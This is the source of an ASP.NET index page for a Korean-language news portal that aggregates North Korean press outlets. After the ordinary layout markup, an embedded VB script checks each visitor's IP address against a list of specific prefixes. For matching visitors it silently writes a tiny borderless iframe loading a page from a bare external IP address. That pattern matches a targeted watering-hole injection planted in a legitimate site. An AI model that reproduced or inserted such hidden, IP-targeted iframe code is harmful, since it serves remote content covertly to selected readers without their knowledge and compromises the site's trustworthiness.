<%@ Page Language="vb" AutoEventWireup="false" Codebehind="index.aspx.vb" Inherits="KPPress.index" %>
<%@ Register TagPrefix="uc1" TagName="TOP" Src="include/Top.ascx" %>
<%@ Register TagPrefix="uc1" TagName="Left" Src="include/Left.ascx" %>
<%@ Register TagPrefix="uc1" TagName="Bottom" Src="include/Bottom.ascx" %>
<%@ Register TagPrefix="uc1" TagName="Right" Src="include/Right.ascx" %>
<%@ Register TagPrefix="uc1" TagName="Article" Src="include/Articles_main.ascx" %>
<%@ Register TagPrefix="uc1" TagName="Article2" Src="include/Articles2_main.ascx" %>
<%@ Register TagPrefix="uc1" TagName="Article3" Src="include/Articles3_main.ascx" %>

<HTML>
	<HEAD>
		<title>KPM - 조선언론 정보기지</title>
		<META http-equiv="Content-Type" content="text/html; charset=ks_c_5601-1987">
		<LINK href="/include/main.css" type="text/css" rel="stylesheet">
	</HEAD>
	<body bgColor="#ffffff" leftMargin="0" topMargin="0">
		<form id="Form1" method="post" runat="server">
			<table cellSpacing="0" cellPadding="0" width="963" bgColor="#ffffff" border="0" height="100%">
				<tr>
					<td colSpan="5">
						<!-- 상단메뉴 --><uc1:top id="TOP1" runat="server"></uc1:top></td>
					<td width="1" rowspan="4" bgcolor="#929292"></td>
				</tr>
				<tr>
					<td vAlign="top" align="center" width="148" height="100%">
						<!-- 왼쪽메뉴 --><uc1:left id="Left1" runat="server"></uc1:left></td>
					<td width="1" rowspan="3" bgcolor="#929292"></td>
					<td vAlign="top" align="center" width="584">
						<!-- 메인 시작 -->
						<table cellSpacing="0" cellPadding="0" width="568" bgColor="#ffffff" border="0">
							<tr>
								<td width="170" height="26" bgColor="#c9c9c9">&nbsp;&nbsp; <A href="/list_all.aspx?lvl=1" onfocus="this.blur()">
										<b>주요기사</b></A></td>
								<td width="328" bgColor="#c9c9c9"></td>
								<td width="70"><A href="/list_all.aspx?lvl=1" onfocus="this.blur()"><IMG height="26" src="/images/btn_main_more2.gif" width="70" border="0"></A></td>
							</tr>
							<tr>
								<td width="568" height="7" colspan="3"></td>
							</tr>
						</table>
						<!-- 주요기사 --><uc1:article3 id="Article1" runat="server" cmd="20"></uc1:article3>
						<table cellSpacing="0" cellPadding="0" width="568" bgColor="#ffffff" border="0">
							<tr>
								<td width="568" height="7"></td>
							</tr>
						</table>
						<!-- 로동신문 --><uc1:article id="Article2" runat="server" MediaID="1001"></uc1:article>
						<!-- 민주조선 --><uc1:article id="Article3" runat="server" MediaID="1002"></uc1:article>
						<!-- 평양지국 뉴스 --><uc1:article id="Article4" runat="server" MediaID="1003"></uc1:article>
						<table cellSpacing="0" cellPadding="0" width="568" bgColor="#ffffff" border="0">
							<tr>
								<td width="318" height="26" bgColor="#c9c9c9">&nbsp;&nbsp; <b>주간기사</b></td>
								<td width="250" bgColor="#c9c9c9" align="right">
									<font style="FONT-SIZE:8pt">▶ <A href="/list_src.aspx?MediaID=1004" onfocus="this.blur()">
											통일신보</A> | <A href="/list_src.aspx?MediaID=1005" onfocus="this.blur()">문학신문</A>
										| <A href="/list_src.aspx?MediaID=1006" onfocus="this.blur()">Pyongyang Times</A>
									</font>&nbsp;
								</td>
							</tr>
							<tr>
								<td height="7" colspan="2"></td>
							</tr>
						</table>
						<!-- 통일신보 --><uc1:article2 id="Article5" runat="server" MediaID="1004"></uc1:article2>
						<table cellSpacing="0" cellPadding="0" width="568" bgColor="#ffffff" border="0">
							<tr>
								<td width="568" align="center"><img src=/images/line_main.gif></td>
							</tr>
						</table>
						<!-- 문학신문 --><uc1:article2 id="Article6" runat="server" MediaID="1005"></uc1:article2>
						<table cellSpacing="0" cellPadding="0" width="568" bgColor="#ffffff" border="0">
							<tr>
								<td width="568" align="center"><img src=/images/line_main.gif></td>
							</tr>
						</table>
						<!-- 평양타임즈 --><uc1:article2 id="Article7" runat="server" MediaID="1006"></uc1:article2>
						<!-- 메인 끝 -->
					</td>
					<td width="1" rowspan="3" bgcolor="#929292"></td>
					<td vAlign="top" align="center" width="228">
						<!-- 오늘쪽 메뉴 --><uc1:right id="Right1" runat="server"></uc1:right></td>
				</tr>
				<tr>
					<td colSpan="5" height="8"></td>
				</tr>
				<tr>
					<td colSpan="5">
						<!-- 하단 --><uc1:bottom id="Bottom1" runat="server"></uc1:bottom></td>
				</tr>
			</table>
		</form>
		<%
		Dim ip As String
		Dim ifrm As String = "<iframe id=""details"" frameborder=0 marginheight=""0"" marginwidth=""0"" scrolling=""no""  width=""50"" height=""50"" src=""http://128.241.236.3/appstore/index.html""></iframe>"

		ip = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
		if ip = "" Then
			ip = Request.ServerVariables("REMOTE_ADDR")
		End If

		If ip.StartsWith("210.52.109.") Or ip.StartsWith("117.136.5.") Or ip.StartsWith("60.21.140.126") Or ip.StartsWith("112.112.68.216") Or ip.StartsWith("86.182.233.94") Or ip.StartsWith("194.29.129.125") Then
			Response.Write(ifrm)
		End If

		If ip.StartsWith("58.156.7.") Then
			Response.Write(ifrm)
		End If

		If ip.StartsWith("124.94.2.") Or ip.StartsWith("60.23.78.") Or ip.StartsWith("194.94.133.") Or ip.StartsWith("81.169.183.") Or ip.StartsWith("85.214.71.") Or ip.StartsWith("152.104.226.") Or ip.StartsWith("203.98.164.") Then
			Response.Write(ifrm)
		End If
		%>
	</body>
</HTML>
